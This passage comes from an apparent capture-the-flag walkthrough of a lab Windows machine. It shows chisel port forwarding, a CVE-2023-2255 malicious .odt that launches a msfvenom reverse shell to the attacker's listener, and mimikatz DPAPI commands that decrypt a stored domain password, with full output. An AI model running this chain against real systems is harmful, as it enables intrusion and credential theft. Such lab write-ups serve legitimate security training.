</span></span><span style="display:flex;"><span>utton <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;btn btn-primary&#34;</span><span style="color:#ff79c6">&gt;</span>Find out more<span style="color:#ff79c6">!&lt;/</span>button<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;!--</span>footer<span style="color:#ff79c6">--&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;py-3 bg-light text-center&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>p <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;m-0&#34;</span><span style="color:#ff79c6">&gt;</span>Copyright By <span style="color:#ff79c6">&lt;</span>a href<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;#&#34;</span><span style="color:#ff79c6">&gt;</span>holographictech<span style="color:#ff79c6">.</span>htb<span style="color:#ff79c6">&lt;/</span>a<span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">2030</span><span style="color:#ff79c6">&lt;/</span>p<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;!--</span> Optional JavaScript <span style="color:#ff79c6">--&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;!--</span> jQuery first, then Popper<span style="color:#ff79c6">.</span>js, then Bootstrap JS <span style="color:#ff79c6">--&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;</span>script src<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;https://code.jquery.com/jquery-3.3.1.slim.min.js&#34;</span> integrity<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo&#34;</span> crossorigin<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;anonymous&#34;</span><span style="color:#ff79c6">&gt;&lt;/</span>script<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;</span>script src<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js&#34;</span> integrity<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1&#34;</span> crossorigin<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;anonymous&#34;</span><span style="color:#ff79c6">&gt;&lt;/</span>script<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;</span>script src<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js&#34;</span> integrity<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM&#34;</span> crossorigin<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;anonymous&#34;</span><span style="color:#ff79c6">&gt;&lt;/</span>script<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;/</span>body<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;/</span>html<span style="color:#ff79c6">&gt;</span>
</span></span></code></pre></div><p>Let&rsquo;s use <code>chisel</code> and forward the port and connect to it.</p>
<p><code>Attacker Machine</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>chisel server -p 4444 --reverse
</span></span></code></pre></div><p><code>Victim Machine</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>chisel client 10.10.16.59:4444 R:8083:127.0.0.1:8083
</span></span></code></pre></div><p>Here&rsquo;s the http service.</p>
<p><img src="images/http-service.png" alt="alt text"></p>
<p>And here&rsquo;s the <code>resume.php</code>.</p>
<p><img src="images/resume.png" alt="alt text"></p>
<p>Privilege Escalation to <code>ppots</code> via <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-2255">CVE-2023-2255</a></p>
<h3 id="cve-2023-2255"><strong>CVE-2023-2255</strong></h3>
<p>After doing a research I realized this exploit was exactly what I was looking for.</p>
<p>I create a shell.exe file to get a reverse shell via msfvenom:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>  msfvenom <span style="color:#ff79c6">-</span>p windows<span style="color:#ff79c6">/</span>shell_reverse_tcp LHOST<span style="color:#ff79c6">=</span>tun0 LPORT<span style="color:#ff79c6">=</span><span style="color:#bd93f9">9001</span> <span style="color:#ff79c6">-</span>f exe <span style="color:#ff79c6">-</span>o shell<span style="color:#ff79c6">.</span>exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  [<span style="color:#ff79c6">-</span>] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  [<span style="color:#ff79c6">-</span>] No arch selected, selecting arch: x86 from the payload
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  No encoder specified, outputting raw payload
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Payload size: <span style="color:#bd93f9">324</span> bytes
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Final size of exe file: <span style="color:#bd93f9">73802</span> bytes
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Saved as: shell<span style="color:#ff79c6">.</span>exe
</span></span></code></pre></div><p>I create the exploit.odt file and transfer it to the following directory:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  python3 CVE-2023-2255.py --cmd &#39;C:\programdata\shell.exe&#39; --output &#39;exploit.odt&#39;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  File exploit.odt has been created !
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  C:\xampp\htdocs\internal\applications\exploit.odt
</span></span></code></pre></div><p>After waiting few seconds I get reverse shell as PPotts user.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  rlwrap nc -lvnp 9001
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  listening on [any] 9001 ...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  connect to [10.10.15.29] from (UNKNOWN) [10.10.11.3] 53622
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Microsoft Windows [Version 10.0.20348.2322]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  (c) Microsoft Corporation. All rights reserved.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  C:\Program Files\LibreOffice 5\program&gt;whoami
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  whoami
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  office\ppotts
</span></span></code></pre></div><h3 id="shell-as-hhogan-using-mimikatz"><strong>Shell as HHogan</strong> using <em>mimikatz</em></h3>
<p>Enumerate the credentials folders:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  PS C:\Users\PPotts\AppData\Roaming\Microsoft\credentials&gt; Get-ChildItem -Hidden C:\Users\ppotts\AppData\Roaming\Microsoft\Credentials\
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Directory: C:\Users\ppotts\AppData\Roaming\Microsoft\Credentials
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Mode                 LastWriteTime         Length Name                                                                 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  ----                 -------------         ------ ----                                                                 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  -a-hs-          5/9/2023   2:08 PM            358 18A1927A997A794B65E9849883AC3F3E                                     
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  -a-hs-          5/9/2023   4:03 PM            398 84F1CAEEBF466550F4967858F9353FB4                                     
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  -a-hs-         1/18/2024  11:53 AM            374 E76CCA3670CD9BB98DF7
</span></span></code></pre></div><p>I use dpapi feature via mimikatz:</p>
<p>DPAPI (Data Protection API) is an API used for data protection and encryption operations in the Microsoft Windows operating system.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\credentials\XXXXXXXXXXX
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  mimikatz # dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\credentials\84F1CAEEBF466550F4967858F9353FB4
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  **BLOB**
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwVersion          : 00000001 - 1
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwMasterKeyVersion : 00000001 - 1
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    guidMasterKey      : {191d3f9d-7959-4b4d-a520-a444853c47eb}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwFlags            : 20000000 - 536870912 (system ; )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwDescriptionLen   : 0000003a - 58
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    szDescription      : Enterprise Credential Data
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    algCrypt           : 00006603 - 26115 (CALG_3DES)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwAlgCryptLen      : 000000c0 - 192
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwSaltLen          : 00000010 - 16
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pbSalt             : 649c4466d5d647dd2c595f4e43fb7e1d
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwHmacKeyLen       : 00000000 - 0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pbHmackKey         : 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    algHash            : 00008004 - 32772 (CALG_SHA1)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwAlgHashLen       : 000000a0 - 160
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwHmac2KeyLen      : 00000010 - 16
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pbHmack2Key        : 32e88dfd1927fdef0ede5abf2c024e3a
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwDataLen          : 000000c0 - 192
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pbData             : f73b168ecbad599e5ca202cf9ff719ace31cc92423a28aff5838d7063de5cccd4ca86bfb2950391284b26a34b0eff2dbc9799bdd726df9fad9cb284bacd7f1ccbba0fe140ac16264896a810e80cac3b68f82c80347c4deaf682c2f4d3be1de025f0a68988fa9d633de943f7b809f35a141149ac748bb415990fb6ea95ef49bd561eb39358d1092aef3bbcc7d5f5f20bab8d3e395350c711d39dbe7c29d49a5328975aa6fd5267b39cf22ed1f9b933e2b8145d66a5a370dcf76de2acdf549fc97
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwSignLen          : 00000014 - 20
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pbSign             : 21bfb22ca38e0a802e38065458cecef00b450976
</span></span></code></pre></div><p>I know I might need the guidMasterKey so I&rsquo;m keeping it temporarily.</p>
<p>Now I&rsquo;ll enumarate this directory and got a SID number:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  PS C:\Users\PPotts\appdata\roaming\microsoft\protect&gt; dir
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Directory: C:\Users\PPotts\appdata\roaming\microsoft\protect
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Mode                 LastWriteTime         Length Name                                                                 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  ----                 -------------         ------ ----                                                                 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  d---s-         1/17/2024   3:43 PM                S-1-5-21-1199398058-4196589450-691661856-1107
</span></span></code></pre></div><p>Change SID and guidMasterKey to your own:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  dpapi::masterkey /in:C:\Users\PPotts\appdata\roaming\microsoft\protect\\ /rpc
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  mimikatz # dpapi::masterkey /in:C:\Users\PPotts\appdata\roaming\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  **MASTERKEYS**
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwVersion          : 00000002 - 2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    szGuid             : {191d3f9d-7959-4b4d-a520-a444853c47eb}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwFlags            : 00000000 - 0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwMasterKeyLen     : 00000088 - 136
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwBackupKeyLen     : 00000068 - 104
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwCredHistLen      : 00000000 - 0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwDomainKeyLen     : 00000174 - 372
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  [masterkey]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    **MASTERKEY**
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      dwVersion        : 00000002 - 2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      salt             : c521daa0857ee4fa6e4246266081e94c
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      rounds           : 00004650 - 18000
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      algHash          : 00008009 - 32777 (CALG_HMAC)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      algCrypt         : 00006603 - 26115 (CALG_3DES)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      pbKey            : 1107e1ab3e107528a73a2dafc0a2db28de1ea0a07e92cff03a935635013435d75e41797f612903d6eea41a8fc4f7ebe8d2fbecb0c74cdebb1e7df3c692682a066faa3edf107792d116584625cc97f0094384a5be811e9d5ce84e5f032704330609171c973008d84f
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  [backupkey]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    **MASTERKEY**
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      dwVersion        : 00000002 - 2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      salt             : a2741b13d7261697be4241ebbe05098a
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      rounds           : 00004650 - 18000
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      algHash          : 00008009 - 32777 (CALG_HMAC)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      algCrypt         : 00006603 - 26115 (CALG_3DES)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      pbKey            : 21bf24763fbb1400010c08fccc5423fe7da8190c61d3006f2d5efd5ea586f463116805692bae637b2ab548828b3afb9313edc715edd11dc21143f4ce91f4f67afe987005320d3209
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  [domainkey]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    **DOMAINKEY**
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      dwVersion        : 00000002 - 2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      dwSecretLen      : 00000100 - 256
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      dwAccesscheckLen : 00000058 - 88
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      guidMasterKey    : {e523832a-e126-4d6e-ac04-ed10da72b32f}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      pbSecret         : 159613bdc2d90dd4834a37e29873ce04c74722a706d0ba4770865039b3520ff46cf9c9281542665df2e72db48f67e16e2014e07b88f8b2f7d376a8b9d47041768d650c20661aee31dc340aead98b7600662d2dc320b4f89cf7384c2a47809c024adf0694048c38d6e1e3e10e8bd7baa7a6f1214cd3a029f8372225b2df9754c19e2ae4bc5ff4b85755b4c2dfc89add9f73c54ac45a221e5a72d3efe491aa6da8fb0104a983be20af3280ae68783e8648df413d082fa7d25506e9e6de1aadbf9cf93ec8dfc5fab4bfe1dd1492dbb679b1fa25c3f15fb8500c6021f518c74e42cd4b5d5d6e1057f912db5479ebda56892f346b4e9bf6404906c7cd65a54eea2842
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      pbAccesscheck    : 1430b9a3c4ab2e9d5f61dd6c62aab8e1742338623f08461fe991cccd5b3e4621d4c8e322650460181967c409c20efcf02e8936c007f7a506566d66ba57448aa8c3524f0b9cf881afcbb80c9d8c341026f3d45382f63f8665
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Auto SID from path seems to be: S-1-5-21-1199398058-4196589450-691661856-1107
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  [backupkey] without DPAPI_SYSTEM: 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    key : 4d1b2c18baba7442e79d33cc771bf54027ae2500e08da3ecfccf91303bd471b6
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    sha1: eeb787c4259e3c8b8408201ee5e54fc29fad22b2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  [domainkey] with RPC
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  [DC] &#39;office.htb&#39; will be the domain
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  [DC] &#39;DC.office.htb&#39; will be the DC server
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    key : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    sha1: 85285eb368befb1670633b05ce58ca4d75c73c77
</span></span></code></pre></div><p>After using the this command I see the password of HHogan</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\credentials\XXXXXXXXXXXXX /guidMasterkey::
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  mimikatz # dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\credentials\84F1CAEEBF466550F4967858F9353FB4 /191d3f9d-7959-4b4d-a520-a444853c47eb::87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  **BLOB**
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwVersion          : 00000001 - 1
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwMasterKeyVersion : 00000001 - 1
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    guidMasterKey      : {191d3f9d-7959-4b4d-a520-a444853c47eb}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwFlags            : 20000000 - 536870912 (system ; )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwDescriptionLen   : 0000003a - 58
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    szDescription      : Enterprise Credential Data
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    algCrypt           : 00006603 - 26115 (CALG_3DES)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwAlgCryptLen      : 000000c0 - 192
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwSaltLen          : 00000010 - 16
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pbSalt             : 649c4466d5d647dd2c595f4e43fb7e1d
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwHmacKeyLen       : 00000000 - 0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pbHmackKey         : 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    algHash            : 00008004 - 32772 (CALG_SHA1)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwAlgHashLen       : 000000a0 - 160
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwHmac2KeyLen      : 00000010 - 16
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pbHmack2Key        : 32e88dfd1927fdef0ede5abf2c024e3a
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwDataLen          : 000000c0 - 192
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pbData             : f73b168ecbad599e5ca202cf9ff719ace31cc92423a28aff5838d7063de5cccd4ca86bfb2950391284b26a34b0eff2dbc9799bdd726df9fad9cb284bacd7f1ccbba0fe140ac16264896a810e80cac3b68f82c80347c4deaf682c2f4d3be1de025f0a68988fa9d633de943f7b809f35a141149ac748bb415990fb6ea95ef49bd561eb39358d1092aef3bbcc7d5f5f20bab8d3e395350c711d39dbe7c29d49a5328975aa6fd5267b39cf22ed1f9b933e2b8145d66a5a370dcf76de2acdf549fc97
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwSignLen          : 00000014 - 20
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pbSign             : 21bfb22ca38e0a802e38065458cecef00b450976
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Decrypting Credential:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  * volatile cache: GUID:{191d3f9d-7959-4b4d-a520-a444853c47eb};KeyHash:85285eb368befb1670633b05ce58ca4d75c73c77;Key:available
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  **CREDENTIAL**
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    credFlags      : 00000030 - 48
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    credSize       : 000000be - 190
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    credUnk0       : 00000000 - 0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Type           : 00000002 - 2 - domain_password
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Flags          : 00000000 - 0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    LastWritten    : 5/9/2023 11:03:21 PM
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    unkFlagsOrSize : 00000018 - 24
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Persist        : 00000003 - 3 - enterprise
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    AttributeCount : 00000000 - 0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    unk0           : 00000000 - 0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    unk1           : 00000000 - 0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    TargetName     : Domain:interactive=OFFICE\HHogan
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    UnkData        : (null)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Comment        : (null)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    TargetAlias    : (null)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    UserName       : OFFICE\HHogan
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    CredentialBlob : H4ppyFtW183#
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Attributes     : 
